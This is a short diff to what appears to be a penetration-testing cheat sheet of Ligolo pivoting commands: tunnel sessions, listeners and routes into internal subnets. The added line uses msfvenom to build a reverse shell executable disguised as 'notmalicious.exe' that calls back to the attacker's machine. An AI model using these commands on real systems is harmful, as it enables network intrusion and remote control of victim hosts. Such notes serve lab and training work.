@@ -52,7 +52,8 @@ Ligolo:./agent -connect <kali>:11601 -ignore-cert # Connect Linux agent to proxy
 Ligolo:session # Select agent session in Ligolo console; kali-machine
 Ligolo:session 1 # Select specific session by number; kali-machine
 Ligolo:tunnel_start # Start tunnel for selected session; kali-machine
-Ligolo:listener_add --addr 0.0.0.0:<port> --to <kali>:<kaliPort> # Add reverse listener; kali-machine
+Ligolo:msfvenom -p <payload> LHOST=<kali> LPORT=1234 -f exe -o notmalicious.exe #generate reverse shell payload executable to be used with Ligolo pivoting for callback into attacker machine; kali-machine
+Ligolo:listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:<kaliPort> # Add reverse listener; kali-machine
 Ligolo:sudo ip route add 172.16.1.0/24 dev ligolo # Add route for target network; kali-machine
 Ligolo:sudo ip route add 10.10.0.0/16 dev ligolo # Add route for another network; kali-machine
 Ligolo:sudo ip route add 240.0.0.1/32 dev ligolo # Add route for target localhost access; kali-machine
